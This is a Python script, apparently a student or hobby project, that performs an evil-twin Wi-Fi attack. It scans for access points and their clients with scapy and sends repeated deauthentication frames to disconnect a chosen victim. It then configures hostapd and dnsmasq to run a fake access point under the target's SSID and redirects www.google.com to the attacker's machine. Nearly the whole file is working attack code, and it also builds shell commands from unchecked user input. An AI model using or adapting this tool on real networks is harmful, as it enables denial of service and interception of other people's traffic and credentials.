import os
import subprocess
from string import Template

from pyatspi import interface

import prepare_conf

hiddenSSIDs = dict()
# initialize the networks dataframe that will contain all access points nearby
import pandas
from scapy.all import *
# from threading import  thread
# initialize the networks dataframe that will contain all access points nearby
from scapy.layers.dot11 import Dot11Beacon

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "BEACON", "ROW", "CHANNEL"])
# set the index BSSID (MAC address of the AP)
# networks.set_index("BSSID", inplace=True)
list_users = []
target_AP = ""

# set the index BSSID (MAC address of the AP)
# networks.set_index("BSSID", inplace=True)

channel = 0


def DNSmasq():
    # kill all dnsmasq files
    os.system('service dnsmasq stop >/dev/null 2>&1')
    os.system('killall dnsmasq >/dev/null 2>&1')
    text = f"interface=wlan1\n" \
           f"local=/localnet/\n" \
           f"server=/localnet/192.168.0.1\n" \
           f"domain=localnet\n" \
           f"dhcp-range=192.168.0.2, 192.168.0.30, 255.255.255.0, 12h\n " \
           f"dhcp-option=3 ,192.168.0.1\n" \
           f"dhcp-option=6 ,192.168.0.1\n" \
           f"address=/www.google.com/192.168.0.1\n" \
           f"server=8.8.8.8\n" \
           f"log-queries\n" \
           f"log-dhcp\n" \
           f"dhcp-authoritative\n" \
           f"listen-address=127.0.0.1"
    with open('conf/dnsmasq.conf', 'w') as f:
        f.write(text)
    f.close()


def PacketHandler(packet):
    if packet.haslayer(Dot11Beacon):
        if packet.type == 0 and packet.subtype == 8:
            # print(packet.info.decode())
            if packet.addr2 in networks["BSSID"].unique():
                x = networks[networks["BSSID"] == packet.addr2].iloc[0]
                x["BEACON"] = x["BEACON"] + 4
                networks.loc[x["ROW"], "BEACON"] = int(x["BEACON"]) + 1
                # myBeacon[packet.addr2] = myBeacon[packet.addr2] + 1
            elif len(packet.info) > 0:
                list1 = [packet.addr2, packet.info.decode(), 1, len(networks), channel]
                networks.loc[len(networks)] = list1


def searchUsers(packet):
    if packet.haslayer(Dot11):
        # print (packet.addr1 != packet.addr3)
        # print(target_AP)
        if (packet.addr3 == target_AP) or packet.addr2 == target_AP or packet.addr1 == target_AP:
            if packet.addr1 != "ff:ff:ff:ff:ff:ff":
                # print(packet.addr1, packet.addr2, packet.addr1)
                DS = packet.FCfield & 0x3
                to_ds = DS & 0x1 != 0
                from_ds = DS & 0x2 != 0
                # print(to_ds)
                if to_ds and not from_ds and packet.addr2 not in list_users:
                    l = [packet.addr2, channel]
                    list_users.append(l)
                    print(1)


def deauth(target_mac, gateway_mac, iface):
    print(target_mac)
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, count=121, iface=iface, loop=2)


def attack():
    os.system("rm -rf build/")
    os.system('cp -r conf build')

    global target_AP
    global channel
    # interface name, check using iwconfig
    os.system("iwconfig")
    interface_sniff = input("choose interface to sniff")
    interface_route = input("choose interface to route")
    os.system(f"ifconfig {interface_sniff} down")
    os.system(f"iwconfig {interface_sniff} mode monitor")
    os.system(f"ifconfig {interface_sniff} up")

    # start sniffing
    print("Start sniff AP")
    os.system(f"iwconfig  {interface_sniff} channel 1")
    for i in range(1, 14):
        print(f'scanning in channel {i}"')
        os.system(f"iwconfig  {interface_sniff} channel {i}")
        channel = i
        sniff(prn=PacketHandler, iface=interface_sniff, timeout=2)
    print(networks)
    line = int(input("Choose line to attack"))
    target_AP = networks.iloc[line]["BSSID"]
    AP_name = networks.iloc[line]["SSID"]
    # wlan_name=networks.loc(line)["BSSID"]
    # print(f'start search users from {wlan_name}')
    print("start sniff client")

    # for i in range(1, 14):
    #     print(f'iwconfig  {interface_sniff} channel {i}"')
    #     os.system(f"iwconfig  {interface_sniff} channel {i}")
    channel = networks.iloc[line]["CHANNEL"]
    for i in range(1, 14):
        print(f'scanning in channel {i}"')
        os.system(f"iwconfig  {interface_sniff} channel {i}")
        channel = i
        sniff(prn=searchUsers, iface=interface_sniff, timeout=3)
    print(list_users)
    channel = input("choose channel to attack")
    os.system(f"iwconfig  {interface_sniff} channel {channel}")

    victem = input("Choose user to attack")
    cmd2 = "sudo python3 prepare_conf.py"

    deauth(victem, target_AP, interface_sniff)
    fake_ssid=networks.iloc[line]["SSID"]
    print(fake_ssid)
    p = subprocess.Popen(cmd2, shell=True, preexec_fn=os.setsid)

    with open('build/hostapd.conf', 'r+') as f:
        template = Template(f.read())
        f.seek(0)
        f.write(template.substitute(INTERFACE=interface_route, NETWORK=fake_ssid))
        f.truncate()


    with open('build/dnsmasq.conf', 'r+') as f:
        template = Template(f.read())
        f.seek(0)
        f.write(template.substitute(INTERFACE=interface_route))
        f.truncate()
    os.system(f'x-terminal-emulator -e bash -c "{cmd2}"')

    # prepare_conf.make_new_af(interface_route, AP_name)
